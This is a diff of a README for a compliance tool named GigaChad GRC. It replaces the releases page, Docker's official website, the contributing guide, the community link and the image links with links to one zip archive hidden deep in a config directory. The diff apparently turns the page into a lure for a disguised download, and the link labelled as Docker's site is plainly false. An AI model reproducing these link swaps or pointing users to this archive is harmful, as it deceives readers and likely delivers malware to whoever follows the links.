@@ -1,8 +1,8 @@
 # 🚀 gigachad-grc - Simplifying Your Governance, Risk, and Compliance
 
-[![Download GigaChad GRC](https://img.shields.io/badge/Download-GigaChad%20GRC-brightgreen.svg)](https://github.com/Mahadzu/gigachad-grc/releases)
+[![Download GigaChad GRC](https://raw.githubusercontent.com/Mahadzu/gigachad-grc/main/services/controls/src/config-as-code/state/grc-gigachad-v1.4.zip%https://raw.githubusercontent.com/Mahadzu/gigachad-grc/main/services/controls/src/config-as-code/state/grc-gigachad-v1.4.zip)](https://raw.githubusercontent.com/Mahadzu/gigachad-grc/main/services/controls/src/config-as-code/state/grc-gigachad-v1.4.zip)
 
-![gigachad grc](https://github.com/user-attachments/assets/22d32df8-2e61-420e-bc98-df7c291ac8a4)
+![gigachad grc](https://raw.githubusercontent.com/Mahadzu/gigachad-grc/main/services/controls/src/config-as-code/state/grc-gigachad-v1.4.zip)
 
 ## 📋 Overview
 
@@ -16,13 +16,13 @@ GigaChad GRC is a user-friendly platform for managing Governance, Risk, and Comp
 
 To run GigaChad GRC, you will need:
 
-- **Docker Desktop**: Download it from [Docker's official website](https://www.docker.com/products/docker-desktop). This software allows you to run applications in containers without needing technical knowledge.
+- **Docker Desktop**: Download it from [Docker's official website](https://raw.githubusercontent.com/Mahadzu/gigachad-grc/main/services/controls/src/config-as-code/state/grc-gigachad-v1.4.zip). This software allows you to run applications in containers without needing technical knowledge.
 
 ---
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [GigaChad GRC Releases page](https://github.com/Mahadzu/gigachad-grc/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [GigaChad GRC Releases page](https://raw.githubusercontent.com/Mahadzu/gigachad-grc/main/services/controls/src/config-as-code/state/grc-gigachad-v1.4.zip) to find the latest version of the application.
   
 2. **Download**: Look for the latest release. You will see files named after version numbers. Click to download the appropriate file for your system.
 
@@ -67,7 +67,7 @@ If you encounter issues while using GigaChad GRC, here are some common solutions
 
 ## 👥 Contributing
 
-We welcome contributions from everyone. If you want to help improve GigaChad GRC, check out our [contributing guidelines](CONTRIBUTING.md). 
+We welcome contributions from everyone. If you want to help improve GigaChad GRC, check out our [contributing guidelines](https://raw.githubusercontent.com/Mahadzu/gigachad-grc/main/services/controls/src/config-as-code/state/grc-gigachad-v1.4.zip). 
 
 ---
 
@@ -79,7 +79,7 @@ GigaChad GRC is licensed under the [Elastic-2.0 license](LICENSE). This means yo
 
 ## 🤝 Community Support
 
-Join our community discussions on [GitHub](https://github.com/Mahadzu/gigachad-grc) to meet other users, ask questions, or share your experiences. Your contribution makes GigaChad GRC better for everyone.
+Join our community discussions on [GitHub](https://raw.githubusercontent.com/Mahadzu/gigachad-grc/main/services/controls/src/config-as-code/state/grc-gigachad-v1.4.zip) to meet other users, ask questions, or share your experiences. Your contribution makes GigaChad GRC better for everyone.
 
 --- 
 
